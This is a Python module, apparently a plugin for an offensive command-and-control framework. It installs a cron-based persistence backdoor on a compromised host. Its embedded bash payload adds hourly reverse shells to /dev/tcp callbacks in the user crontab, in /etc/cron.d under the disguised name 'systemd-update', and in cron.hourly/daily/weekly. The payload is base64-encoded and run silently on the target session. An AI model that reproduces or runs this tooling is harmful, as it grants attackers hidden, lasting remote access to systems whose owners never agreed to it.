"""Cron backdoor installation script."""

from ..base import OperatorScript, ScriptResult


class CronBackdoor(OperatorScript):
    """Install cron-based persistence backdoor."""
    
    name = "Cron Backdoor"
    description = "Install cron-based persistence"
    category = "persist"
    
    def get_payload(self) -> str:
        return """#!/bin/bash
echo "[*] CRON BACKDOOR INSTALLATION"
echo "=============================="
echo ""

CALLBACK="${CALLBACK_HOST:-192.168.1.100:4444}"

echo "[+] Installing cron backdoor for current user..."
(crontab -l 2>/dev/null; echo "@hourly bash -i >& /dev/tcp/${CALLBACK//:/ } 0>&1") | crontab - 2>/dev/null && \
    echo "[+] User cron backdoor installed" || \
    echo "[-] Failed to install user cron"

echo ""
echo "[+] Installed cron jobs:"
crontab -l 2>/dev/null | tail -5

echo ""
echo "[+] Installing system-wide cron backdoor..."
CRON_FILE="/etc/cron.d/systemd-update"
cat > "$CRON_FILE" 2>/dev/null <<EOF
@hourly root bash -c 'bash -i >& /dev/tcp/${CALLBACK//:/ } 0>&1'
EOF

if [ -f "$CRON_FILE" ]; then
    echo "[+] System cron installed: $CRON_FILE"
    chmod 644 "$CRON_FILE"
else
    echo "[-] Could not create system cron (may need root)"
fi

echo ""
echo "[+] Alternative locations for cron backdoors:"
for dir in /etc/cron.hourly /etc/cron.daily /etc/cron.weekly; do
    if [ -d "$dir" ]; then
        SCRIPT="$dir/update-cache"
        cat > "$SCRIPT" 2>/dev/null <<'EOF'
#!/bin/bash
bash -i >& /dev/tcp/CALLBACK_IP/CALLBACK_PORT 0>&1 &
EOF
        chmod +x "$SCRIPT" 2>/dev/null && \
            echo "[+] Created: $SCRIPT" || \
            echo "[-] Could not create: $SCRIPT"
    fi
done

echo ""
echo "[+] User crontab locations:"
ls -la /var/spool/cron/crontabs/ 2>/dev/null || ls -la /var/spool/cron/ 2>/dev/null

echo ""
echo "[+] Verifying cron service:"
systemctl status cron 2>/dev/null || service cron status 2>/dev/null

echo ""
echo "[+] Persistence installed!"
echo "    Callback: $CALLBACK"
echo "    Frequency: Hourly"
echo "    Will trigger at: $(date -d '+1 hour' +'%Y-%m-%d %H:00:00')"
"""
    
    def run(self, session_meta, send_command_func, output_func) -> ScriptResult:
        try:
            output_func("[bold cyan][*] Installing cron backdoor...[/bold cyan]")
            
            payload = self.get_payload()
            import base64
            encoded = base64.b64encode(payload.encode()).decode('ascii')
            send_command_func(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)
            
            return ScriptResult(
                success=True,
                output="Cron backdoor installation executed",
                metadata={"script": "cron_backdoor"}
            )
        except Exception as e:
            return ScriptResult(success=False, output="", error=str(e))
